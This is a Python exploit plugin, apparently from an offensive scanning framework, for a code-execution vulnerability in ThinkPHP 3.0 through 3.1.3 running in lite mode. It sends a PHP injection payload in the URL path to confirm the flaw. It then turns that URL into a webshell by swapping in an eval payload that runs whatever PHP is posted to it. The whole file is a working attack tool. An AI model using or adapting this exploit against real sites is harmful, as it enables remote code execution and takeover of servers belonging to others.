#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger

author = "Chu <root@sh3ll.me>"
title = "ThinkPHP 3.0,3.1.2,3.1.3"
description = "ThinkPHP 以 lite 模式启动时存在代码执行漏洞"
reference = "http://loudong.360.cn/vul/info/id/2919"

options = {
    'target':'http://www.xxoo.com'
}

def exploit(options):
    url = options['target']['current_value']
    url = url + "/index.php/Index/index/name/${@phpinfo()}"
    logger.process("Requesting target site")
    response = http.get(url)
    if "<title>phpinfo()</title>" in response.text:
        logger.success("Exploitable!")
        logger.success("Phpinfo: %s" % url)
        url = url.replace("@phpinfo()", "@print(eval($_POST[chu]))")
        logger.success("Webshell: %s" % url)
        return url
